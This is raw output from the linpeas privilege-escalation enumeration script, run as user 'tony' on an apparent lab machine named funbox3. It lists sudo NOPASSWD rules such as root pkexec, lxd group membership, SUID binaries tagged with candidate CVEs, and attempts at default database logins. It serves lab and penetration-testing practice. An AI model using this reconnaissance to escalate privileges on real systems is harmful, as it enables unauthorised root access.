Sun 2023-05-07 02:47:19 UTC 22h left       Sat 2023-05-06 02:47:19 UTC 1h 57min ago systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
Sun 2023-05-07 03:10:45 UTC 22h left       Sat 2023-05-06 02:34:45 UTC 2h 10min ago e2scrub_all.timer            e2scrub_all.service           
Mon 2023-05-08 00:00:00 UTC 1 day 19h left Sat 2023-05-06 02:34:45 UTC 2h 10min ago fstrim.timer                 fstrim.service                
n/a                         n/a            n/a                         n/a          snapd.snap-repair.timer      snapd.snap-repair.service     

[+] Analyzing .timer files
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers            
                                                                                  
[+] Analyzing .socket files
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets           
                                                                                  
[+] HTTP sockets
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets           
Socket /run/user/1000/snapd-session-agent.socket owned by tony uses HTTP. Response to /index:
{"type":"error","result":{"message":"method \"GET\" not allowed"}}
Socket /run/snapd.socket owned by root uses HTTP. Response to /index:
{"type":"sync","status-code":200,"status":"OK","result":["TBD"]}
Socket /run/snapd-snap.socket owned by root uses HTTP. Response to /index:
{"type":"error","status-code":401,"status":"Unauthorized","result":{"message":"access denied","kind":"login-required"}}
Socket /var/snap/lxd/common/lxd/unix.socket owned by root uses HTTP. Response to /index:
{"type":"sync","status":"Success","status_code":200,"operation":"","error_code":0,"error":"","metadata":["/1.0"]}

[+] D-Bus config files
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#d-bus             
Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.thermald.conf (        <policy group="power">)

[+] D-Bus Service Objects list
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#d-bus             
NAME                            PID PROCESS         USER             CONNECTION    UNIT                        SESSION DESCRIPTION
:1.1                            638 systemd-timesyn systemd-timesync :1.1          systemd-timesyncd.service   -       -
:1.13                          1342 systemd-network systemd-network  :1.13         systemd-networkd.service    -       -
:1.132                        19186 busctl          tony             :1.132        session-9.scope             9       -
:1.18                          5071 systemd         tony             :1.18         user@1000.service           -       -
:1.2                            702 systemd-resolve systemd-resolve  :1.2          systemd-resolved.service    -       -
:1.4                            781 accounts-daemon root             :1.4          accounts-daemon.service     -       -
:1.5                            831 systemd-logind  root             :1.5          systemd-logind.service      -       -
:1.6                              1 systemd         root             :1.6          init.scope                  -       -
:1.7                            811 networkd-dispat root             :1.7          networkd-dispatcher.service -       -
:1.8                            941 polkitd         root             :1.8          polkit.service              -       -
:1.9                            946 unattended-upgr root             :1.9          unattended-upgrades.service -       -
com.ubuntu.LanguageSelector       - -               -                (activatable) -                           -       -
com.ubuntu.SoftwareProperties     - -               -                (activatable) -                           -       -
io.netplan.Netplan                - -               -                (activatable) -                           -       -
org.freedesktop.Accounts        781 accounts-daemon root             :1.4          accounts-daemon.service     -       -
org.freedesktop.DBus              1 systemd         root             -             init.scope                  -       -
org.freedesktop.PackageKit        - -               -                (activatable) -                           -       -
org.freedesktop.PolicyKit1      941 polkitd         root             :1.8          polkit.service              -       -
org.freedesktop.bolt              - -               -                (activatable) -                           -       -
org.freedesktop.fwupd             - -               -                (activatable) -                           -       -
org.freedesktop.hostname1         - -               -                (activatable) -                           -       -
org.freedesktop.locale1           - -               -                (activatable) -                           -       -
org.freedesktop.login1          831 systemd-logind  root             :1.5          systemd-logind.service      -       -
org.freedesktop.network1       1342 systemd-network systemd-network  :1.13         systemd-networkd.service    -       -
org.freedesktop.resolve1        702 systemd-resolve systemd-resolve  :1.2          systemd-resolved.service    -       -
org.freedesktop.systemd1          1 systemd         root             :1.6          init.scope                  -       -
org.freedesktop.thermald          - -               -                (activatable) -                           -       -
org.freedesktop.timedate1         - -               -                (activatable) -                           -       -
org.freedesktop.timesync1       638 systemd-timesyn systemd-timesync :1.1          systemd-timesyncd.service   -       -


═══════════════════════════════════╣ Network Information ╠════════════════════════════════════                                                                      
[+] Hostname, hosts and DNS                                                       
funbox3                                                                           
127.0.0.1 localhost
127.0.1.1 funbox3

::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

nameserver 127.0.0.53
options edns0

[+] Content of /etc/inetd.conf & /etc/xinetd.conf
/etc/inetd.conf Not Found                                                         
                                                                                  
[+] Interfaces
# symbolic names for networks, see networks(5) for more information               
link-local 169.254.0.0
ens256: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.183.111  netmask 255.255.255.0  broadcast 192.168.183.255
        ether 00:50:56:ba:bd:f9  txqueuelen 1000  (Ethernet)
        RX packets 429795  bytes 61356105 (61.3 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 437442  bytes 178439116 (178.4 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 1229  bytes 105240 (105.2 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1229  bytes 105240 (105.2 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0


[+] Networks and neighbours
Kernel IP routing table                                                           
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
default         _gateway        0.0.0.0         UG    0      0        0 ens256
192.168.183.0   0.0.0.0         255.255.255.0   U     0      0        0 ens256
Address                  HWtype  HWaddress           Flags Mask            Iface
_gateway                 ether   00:50:56:ba:78:c5   C                     ens256

[+] Iptables rules
iptables rules Not Found                                                          
                                                                                  
[+] Active Ports
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports        
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 :::33060                :::*                    LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   

[+] Can I sniff with tcpdump?
No                                                                                
                                                                                  

════════════════════════════════════╣ Users Information ╠════════════════════════════════════                                                                       
[+] My user                                                                       
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#users             
uid=1000(tony) gid=1000(tony) groups=1000(tony),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd)

[+] Do I have PGP keys?
/usr/bin/gpg                                                                      
netpgpkeys Not Found
netpgp Not Found                                                                  
                                                                                  
[+] Clipboard or highlighted text?
xsel and xclip Not Found                                                          
                                                                                  
[+] Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid     
Matching Defaults entries for tony on funbox3:                                    
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User tony may run the following commands on funbox3:
    (root) NOPASSWD: /usr/bin/yelp
    (root) NOPASSWD: /usr/bin/dmf
    (root) NOPASSWD: /usr/bin/whois
    (root) NOPASSWD: /usr/bin/rlogin
    (root) NOPASSWD: /usr/bin/pkexec
    (root) NOPASSWD: /usr/bin/mtr
    (root) NOPASSWD: /usr/bin/finger
    (root) NOPASSWD: /usr/bin/time
    (root) NOPASSWD: /usr/bin/cancel
    (root) NOPASSWD: /root/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/q/r/s/t/u/v/w/x/y/z/.smile.sh

[+] Checking sudo tokens
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#reusing-sudo-tokens                                                                                 
/proc/sys/kernel/yama/ptrace_scope is not enabled (1)                             
gdb wasn't found in PATH

[+] Checking doas.conf
/etc/doas.conf Not Found                                                          
                                                                                  
[+] Checking Pkexec policy
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe#pe-method-2                                                             
                                                                                  
[Configuration]
AdminIdentities=unix-user:0
[Configuration]
AdminIdentities=unix-group:sudo;unix-group:admin

[+] Superusers
root:x:0:0:root:/root:/bin/bash                                                   

[+] Users with console
root:x:0:0:root:/root:/bin/bash                                                   
tony:x:1000:1000:#:/home/tony:/bin/bash

[+] All users & groups
uid=0(root) gid=0(root) groups=0(root)                                            
uid=1(daemon[0m) gid=1(daemon[0m) groups=1(daemon[0m)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=100(systemd-network) gid=102(systemd-network) groups=102(systemd-network)
uid=1000(tony) gid=1000(tony) groups=1000(tony),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd)
uid=101(systemd-resolve) gid=103(systemd-resolve) groups=103(systemd-resolve)
uid=102(systemd-timesync) gid=104(systemd-timesync) groups=104(systemd-timesync)
uid=103(messagebus) gid=106(messagebus) groups=106(messagebus)
uid=104(syslog) gid=110(syslog) groups=110(syslog),4(adm)
uid=105(_apt) gid=65534(nogroup) groups=65534(nogroup)
uid=106(tss) gid=111(tss) groups=111(tss)
uid=107(uuidd) gid=112(uuidd) groups=112(uuidd)
uid=108(tcpdump) gid=113(tcpdump) groups=113(tcpdump)
uid=109(landscape) gid=115(landscape) groups=115(landscape)
uid=110(pollinate) gid=1(daemon[0m) groups=1(daemon[0m)
uid=111(sshd) gid=65534(nogroup) groups=65534(nogroup)
uid=112(mysql) gid=117(mysql) groups=117(mysql)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=5(games) gid=60(games) groups=60(games)
uid=6(man) gid=12(man) groups=12(man)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=9(news) gid=9(news) groups=9(news)
uid=998(lxd) gid=100(users) groups=100(users)
uid=999(systemd-coredump) gid=999(systemd-coredump) groups=999(systemd-coredump)

[+] Login now
 04:45:22 up  2:13,  1 user,  load average: 0.43, 0.10, 0.03                      
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
tony     pts/1    192.168.45.5     04:39   26.00s  0.05s  0.00s /bin/sh ./linpeas.sh

[+] Last logons
tony     pts/1        Sat May  6 04:39:47 2023   still logged in                       192.168.45.5
reboot   system boot  Fri Feb 17 19:42:00 2023   still running                         0.0.0.0
reboot   system boot  Thu Feb 16 08:18:13 2023   still running                         0.0.0.0
reboot   system boot  Wed Feb 15 19:52:17 2023   still running                         0.0.0.0
reboot   system boot  Mon Jan 30 14:14:29 2023   still running                         0.0.0.0

wtmp begins Mon Jan 30 14:14:29 2023

[+] Last time logon each user
Username         Port     From             Latest                                 
tony             pts/1    192.168.45.5     Sat May  6 04:39:47 +0000 2023

[+] Password policy
PASS_MAX_DAYS   99999                                                             
PASS_MIN_DAYS   0
PASS_WARN_AGE   7
ENCRYPT_METHOD SHA512

[+] Do not forget to test 'su' as any other user with shell: without password and with their names as password (I can't do it...)                                   
[+] Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!                                                                   
                                                                                  

═══════════════════════════════════╣ Software Information ╠═══════════════════════════════════                                                                      
[+] MySQL version                                                                 
mysql  Ver 8.0.21-0ubuntu0.20.04.3 for Linux on x86_64 ((Ubuntu))                 

[+] MySQL connection using default root/root ........... No
[+] MySQL connection using root/toor ................... No                       
[+] MySQL connection using root/NOPASS ................. No                       
[+] Searching mysql credentials and exec                                          
From '/etc/mysql/mysql.conf.d/mysqld.cnf' Mysql user: user              = mysql   
Found readable /etc/mysql/my.cnf
!includedir /etc/mysql/conf.d/
!includedir /etc/mysql/mysql.conf.d/

[+] PostgreSQL version and pgadmin credentials
 Not Found                                                                        
                                                                                  
[+] PostgreSQL connection to template0 using postgres/NOPASS ........ No
[+] PostgreSQL connection to template1 using postgres/NOPASS ........ No          
[+] PostgreSQL connection to template0 using pgsql/NOPASS ........... No          
[+] PostgreSQL connection to template1 using pgsql/NOPASS ........... No          
                                                                                  
[+] Apache server info
Version: Server version: Apache/2.4.41 (Ubuntu)                                   
Server built:   2020-04-13T17:19:17
PHP exec extensions
/etc/apache2/mods-available/php7.4.conf-<FilesMatch ".+\.ph(ar|p|tml)$">
/etc/apache2/mods-available/php7.4.conf:    SetHandler application/x-httpd-php
--
/etc/apache2/mods-available/php7.4.conf-<FilesMatch ".+\.phps$">
/etc/apache2/mods-available/php7.4.conf:    SetHandler application/x-httpd-php-source
--
/etc/apache2/mods-enabled/php7.4.conf-<FilesMatch ".+\.ph(ar|p|tml)$">
/etc/apache2/mods-enabled/php7.4.conf:    SetHandler application/x-httpd-php
--
/etc/apache2/mods-enabled/php7.4.conf-<FilesMatch ".+\.phps$">
/etc/apache2/mods-enabled/php7.4.conf:    SetHandler application/x-httpd-php-source

[+] Searching PHPCookies
 Not Found                                                                        
                                                                                  
[+] Searching Wordpress wp-config.php files
wp-config.php Not Found                                                           
                                                                                  
[+] Searching Drupal settings.php files
/default/settings.php Not Found                                                   
                                                                                  
[+] Searching Moodle config.php files
config.php inside a moodle folder Not Found                                       
                                                                                  
[+] Searching Tomcat users file
tomcat-users.xml Not Found                                                        
                                                                                  
[+] Mongo information
mongo binary Not Found                                                            
                                                                                  
[+] Searching supervisord configuration file
supervisord.conf Not Found                                                        
                                                                                  
[+] Searching cesi configuration file
cesi.conf Not Found                                                               
                                                                                  
[+] Searching Rsyncd config file
rsyncd.conf Not Found                                                             
[+] Searching Hostapd config file                                                 
hostapd.conf Not Found                                                            
                                                                                  
[+] Searching wifi conns file
 Not Found                                                                        
                                                                                  
[+] Searching Anaconda-ks config files
anaconda-ks.cfg Not Found                                                         
                                                                                  
[+] Searching .vnc directories and their passwd files
.vnc Not Found                                                                    
                                                                                  
[+] Searching ldap directories and their hashes
/etc/ldap                                                                         
The password hash is from the {SSHA} to 'structural'

[+] Searching .ovpn files and credentials
.ovpn Not Found                                                                   
                                                                                  
[+] Searching ssl/ssh files
PermitRootLogin prohibit-password                                                 
ChallengeResponseAuthentication no
UsePAM yes
PasswordAuthentication yes
 --> /etc/hosts.allow file found, read the rules:
/etc/hosts.allow


Searching inside /etc/ssh/ssh_config for interesting info
Include /etc/ssh/ssh_config.d/*.conf
Host *
    SendEnv LANG LC_*
    HashKnownHosts yes
    GSSAPIAuthentication yes

[+] Searching unexpected auth lines in /etc/pam.d/sshd
No                                                                                
                                                                                  
[+] Searching Cloud credentials (AWS, Azure, GC)
                                                                                  
[+] NFS exports?
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe                                                              
/etc/exports Not Found                                                            
                                                                                  
[+] Searching kerberos conf files and tickets
[i] https://book.hacktricks.xyz/pentesting/pentesting-kerberos-88#pass-the-ticket-ptt                                                                               
tickets kerberos Not Found                                                        
klist Not Found                                                                   
                                                                                  
[+] Searching Kibana yaml
kibana.yml Not Found                                                              
                                                                                  
[+] Searching Knock configuration
Knock.config Not Found                                                            
                                                                                  
[+] Searching logstash files
 Not Found                                                                        
                                                                                  
[+] Searching elasticsearch files
 Not Found                                                                        
                                                                                  
[+] Searching Vault-ssh files
vault-ssh-helper.hcl Not Found                                                    
                                                                                  
[+] Searching AD cached hashes
cached hashes Not Found                                                           
                                                                                  
[+] Searching screen sessions
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions                                                                                 
No Sockets found in /run/screen/S-tony.                                           

[+] Searching tmux sessions
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions                                                                                 
tmux Not Found                                                                    
                                                                                  
[+] Searching Couchdb directory
                                                                                  
[+] Searching redis.conf
                                                                                  
[+] Searching dovecot files
dovecot credentials Not Found                                                     
                                                                                  
[+] Searching mosquitto.conf
                                                                                  
[+] Searching neo4j auth file
                                                                                  
[+] Searching Cloud-Init conf file
                                                                                  
[+] Searching Erlang cookie file
                                                                                  
[+] Searching GVM auth file
                                                                                  
[+] Searching IPSEC files
                                                                                  
[+] Searching IRSSI files
                                                                                  
[+] Searching Keyring files
Keyring folder: /usr/share/keyrings                                               
/usr/share/keyrings:
total 32
-rw-r--r-- 1 root root 2236 Mar 30  2020 ubuntu-advantage-esm-apps.gpg
-rw-r--r-- 1 root root 2264 Mar 30  2020 ubuntu-advantage-esm-infra-trusty.gpg
-rw-r--r-- 1 root root 7399 Sep 17  2018 ubuntu-archive-keyring.gpg
-rw-r--r-- 1 root root 6713 Oct 27  2016 ubuntu-archive-removed-keys.gpg
-rw-r--r-- 1 root root 4097 Feb  6  2018 ubuntu-cloudimage-keyring.gpg
-rw-r--r-- 1 root root    0 Jan 17  2018 ubuntu-cloudimage-removed-keys.gpg
-rw-r--r-- 1 root root 1227 May 27  2010 ubuntu-master-keyring.gpg

[+] Searching Filezilla sites file
                                                                                  
[+] Searching backup-manager files
                                                                                  
[+] Searching uncommon passwd files (splunk)
                                                                                  
[+] Searching GitLab related files
                                                                                  

[+] Searching PGP/GPG
PGP/GPG software:                                                                 
/usr/bin/gpg
netpgpkeys Not Found
netpgp Not Found                                                                  
                                                                                  
[+] Searching vim files
                                                                                  
[+] Checking if containerd(ctr) is available
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/containerd-ctr-privilege-escalation                                                                 
                                                                                  
[+] Checking if runc is available
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/runc-privilege-escalation                                                                           
                                                                                  
[+] Searching docker files
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-docker-socket                                                                              
                                                                                  
[+] Interesting Firefox Files
[i] https://book.hacktricks.xyz/forensics/basic-forensics-esp/browser-artifacts#firefox                                                                             
                                                                                  
[+] Interesting Chrome Files
[i] https://book.hacktricks.xyz/forensics/basic-forensics-esp/browser-artifacts#firefox                                                                             
                                                                                  
[+] Autologin Files
                                                                                  


[+] S/Key authentication
                                                                                  
[+] YubiKey authentication
                                                                                  
[+] Passwords inside pam.d
                                                                                  
[+] FastCGI Params
                                                                                  

[+] SNMPs
                                                                                  


════════════════════════════════════╣ Interesting Files ╠════════════════════════════════════                                                                       
[+] SUID - Check easy privesc, exploits and write perms                           
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid     
strings Not Found                                                                 
-rwsr-xr-x 1 root   root             15K Apr 21  2017 /usr/bin/time               
-rwsr-sr-x 1 daemon daemon           55K Nov 12  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)                                                            
-rwsr-xr-x 1 root   root            427K Mar  4  2019 /snap/core18/1932/usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root   root            427K Mar  4  2019 /snap/core18/1885/usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root   root             59K Mar 22  2019 /snap/core18/1932/usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)                                                                 
-rwsr-xr-x 1 root   root             40K Mar 22  2019 /snap/core18/1932/usr/bin/newgrp  --->  HP-UX_10.20                                                           
-rwsr-xr-x 1 root   root             75K Mar 22  2019 /snap/core18/1932/usr/bin/gpasswd                                                                             
-rwsr-xr-x 1 root   root             44K Mar 22  2019 /snap/core18/1932/usr/bin/chsh                                                                                
-rwsr-xr-x 1 root   root             75K Mar 22  2019 /snap/core18/1932/usr/bin/chfn  --->  SuSE_9.3/10                                                             
-rwsr-xr-x 1 root   root             44K Mar 22  2019 /snap/core18/1932/bin/su
-rwsr-xr-x 1 root   root             59K Mar 22  2019 /snap/core18/1885/usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)                                                                 
-rwsr-xr-x 1 root   root             40K Mar 22  2019 /snap/core18/1885/usr/bin/newgrp  --->  HP-UX_10.20                                                           
-rwsr-xr-x 1 root   root             75K Mar 22  2019 /snap/core18/1885/usr/bin/gpasswd                                                                             
-rwsr-xr-x 1 root   root             44K Mar 22  2019 /snap/core18/1885/usr/bin/chsh                                                                                
-rwsr-xr-x 1 root   root             75K Mar 22  2019 /snap/core18/1885/usr/bin/chfn  --->  SuSE_9.3/10                                                             
-rwsr-xr-x 1 root   root             44K Mar 22  2019 /snap/core18/1885/bin/su
-rwsr-xr-x 1 root   root             63K Jun 28  2019 /snap/core18/1932/bin/ping
-rwsr-xr-x 1 root   root             63K Jun 28  2019 /snap/core18/1885/bin/ping
-rwsr-xr-x 1 root   root             15K Jul  8  2019 /usr/lib/eject/dmcrypt-get-device                                                                             
-rwsr-xr-x 1 root   root             23K Aug 16  2019 /usr/lib/policykit-1/polkit-agent-helper-1                                                                    
-rwsr-xr-x 1 root   root             31K Aug 16  2019 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)                              
-rwsr-xr-x 1 root   root            146K Jan 31  2020 /snap/core18/1932/usr/bin/sudo
-rwsr-xr-x 1 root   root            146K Jan 31  2020 /snap/core18/1885/usr/bin/sudo
-rwsr-xr-x 1 root   root            163K Feb  3  2020 /usr/bin/sudo
-rwsr-xr-x 1 root   root             27K Mar  5  2020 /snap/core18/1885/bin/umount  --->  BSD/Linux(08-1996)                                                        
-rwsr-xr-x 1 root   root             43K Mar  5  2020 /snap/core18/1885/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8              
-rwsr-xr-x 1 root   root             39K Mar  7  2020 /usr/bin/fusermount
-rwsr-xr-x 1 root   root             39K Apr  2  2020 /usr/bin/umount  --->  BSD/Linux(08-1996)                                                                     
-rwsr-xr-x 1 root   root             67K Apr  2  2020 /usr/bin/su
-rwsr-xr-x 1 root   root             55K Apr  2  2020 /usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8                           
-rwsr-xr-x 1 root   root             67K Apr 16  2020 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root   root             44K Apr 16  2020 /usr/bin/newgrp  --->  HP-UX_10.20                                                                            
-rwsr-xr-x 1 root   root             87K Apr 16  2020 /usr/bin/gpasswd
-rwsr-xr-x 1 root   root             52K Apr 16  2020 /usr/bin/chsh
-rwsr-xr-x 1 root   root             84K Apr 16  2020 /usr/bin/chfn  --->  SuSE_9.3/10                                                                              
-rwsr-xr-x 1 root   root            463K May 29  2020 /usr/lib/openssh/ssh-keysign
-rwsr-xr-- 1 root   messagebus       51K Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper                                                                   
-rwsr-xr-- 1 root   systemd-resolve  42K Jun 11  2020 /snap/core18/1932/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-- 1 root   systemd-resolve  42K Jun 11  2020 /snap/core18/1885/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root   root            128K Jul 10  2020 /usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root   root            109K Sep  4  2020 /snap/snapd/9279/usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root   root             27K Sep 16  2020 /snap/core18/1932/bin/umount  --->  BSD/Linux(08-1996)                                                        
-rwsr-xr-x 1 root   root             43K Sep 16  2020 /snap/core18/1932/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8              
-rwsr-xr-x 1 root   root            109K Oct  8  2020 /snap/snapd/9721/usr/lib/snapd/snap-confine

[+] SGID
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid     
-rwsr-sr-x 1 daemon daemon   55K Nov 12  2018 /usr/bin/at                         
-rwxr-sr-x 1 root   shadow   34K Feb 27  2019 /snap/core18/1885/sbin/unix_chkpwd
-rwxr-sr-x 1 root   shadow   34K Feb 27  2019 /snap/core18/1885/sbin/pam_extrausers_chkpwd                                                                          
-rwxr-sr-x 1 root   crontab 355K Mar  4  2019 /snap/core18/1932/usr/bin/ssh-agent
-rwxr-sr-x 1 root   crontab 355K Mar  4  2019 /snap/core18/1885/usr/bin/ssh-agent
-rwxr-sr-x 1 root   shadow   23K Mar 22  2019 /snap/core18/1932/usr/bin/expiry
-rwxr-sr-x 1 root   shadow   71K Mar 22  2019 /snap/core18/1932/usr/bin/chage
-rwxr-sr-x 1 root   shadow   23K Mar 22  2019 /snap/core18/1885/usr/bin/expiry
-rwxr-sr-x 1 root   shadow   71K Mar 22  2019 /snap/core18/1885/usr/bin/chage
-rwxr-sr-x 1 root   utmp     15K Sep 30  2019 /usr/lib/x86_64-linux-gnu/utempter/utempter                                                                           
-rwxr-sr-x 1 root   shadow   43K Dec 17  2019 /usr/sbin/unix_chkpwd
-rwxr-sr-x 1 root   shadow   43K Dec 17  2019 /usr/sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root   crontab  43K Feb 13  2020 /usr/bin/crontab
-rwxr-sr-x 1 root   tty      31K Mar  5  2020 /snap/core18/1885/usr/bin/wall
-rwxr-sr-x 1 root   tty      15K Mar 30  2020 /usr/bin/bsd-write
-rwxr-sr-x 1 root   tty      35K Apr  2  2020 /usr/bin/wall
-rwxr-sr-x 1 root   shadow   31K Apr 16  2020 /usr/bin/expiry
-rwxr-sr-x 1 root   shadow   83K Apr 16  2020 /usr/bin/chage
-rwxr-sr-x 1 root   ssh     343K May 29  2020 /usr/bin/ssh-agent
-rwxr-sr-x 1 root   shadow   34K Jul 21  2020 /snap/core18/1932/sbin/unix_chkpwd
-rwxr-sr-x 1 root   shadow   34K Jul 21  2020 /snap/core18/1932/sbin/pam_extrausers_chkpwd                                                                          
-rwxr-sr-x 1 root   tty      31K Sep 16  2020 /snap/core18/1932/usr/bin/wall

[+] Checking misconfigurations of ld.so
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#ld-so             
/etc/ld.so.conf                                                                   
include /etc/ld.so.conf.d/*.conf

/etc/ld.so.conf.d
  /etc/ld.so.conf.d/libc.conf
/usr/local/lib
  /etc/ld.so.conf.d/x86_64-linux-gnu.conf
/usr/local/lib/x86_64-linux-gnu
/lib/x86_64-linux-gnu
/usr/lib/x86_64-linux-gnu

[+] Capabilities
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities      
Current capabilities:                                                             
Current: =
CapInh: 0000000000000000
CapPrm: 0000000000000000
CapEff: 0000000000000000
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000

Shell capabilities:
0x0000000000000000=
CapInh: 0000000000000000
CapPrm: 0000000000000000
CapEff: 0000000000000000
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000

Files with capabilities:
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/ping = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep

[+] Users with capabilities
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities      
                                                                                  
[+] Files with ACLs
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#acls              
files with acls in searched folders Not Found                                     
                                                                                  
[+] .sh files in path
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#script-binaries-in-path                                                                             
/usr/bin/rescan-scsi-bus.sh                                                       
/usr/bin/gettext.sh

[+] Unexpected in root
/lost+found                                                                       
/swap.img
/lib32
/libx32

[+] Files (scripts) in /etc/profile.d/
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#profiles-files    
total 44                                                                          
drwxr-xr-x  2 root root 4096 Jul 30  2020 .
drwxr-xr-x 97 root root 4096 Oct 30  2020 ..
-rw-r--r--  1 root root   96 Dec  5  2019 01-locale-fix.sh
-rw-r--r--  1 root root 1557 Feb 17  2020 Z97-byobu.sh
-rwxr-xr-x  1 root root 3417 Apr 16  2020 Z99-cloud-locale-test.sh
-rwxr-xr-x  1 root root  873 Apr 16  2020 Z99-cloudinit-warnings.sh
-rw-r--r--  1 root root  825 Apr 10  2020 apps-bin-path.sh
-rw-r--r--  1 root root  729 Feb  2  2020 bash_completion.sh
-rw-r--r--  1 root root 1003 Aug 13  2019 cedilla-portuguese.sh
-rw-r--r--  1 root root 1107 Nov  3  2019 gawk.csh
-rw-r--r--  1 root root  757 Nov  3  2019 gawk.sh

[+] Permissions in init, init.d, systemd, and rc.d
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#init-init-d-systemd-and-rc-d                                                                        
                                                                                  
[+] Hashes inside passwd file? ........... No
[+] Writable passwd file? ................ No                                     
[+] Credentials in fstab/mtab? ........... No                                     
[+] Can I read shadow files? ............. No                                     
[+] Can I read opasswd file? ............. No                                     
[+] Can I write in network-scripts? ...... No                                     
[+] Can I read root folder? .............. No                                     
                                                                                  
[+] Searching root files in home dirs (limit 30)
/home/                                                                            
/root/

[+] Searching folders owned by me containing others files on it
                                                                                  
[+] Readable files belonging to root and readable by me but not world readable
-rw-r----- 1 root adm 526 May  6 02:34 /var/log/apache2/error.log.1               
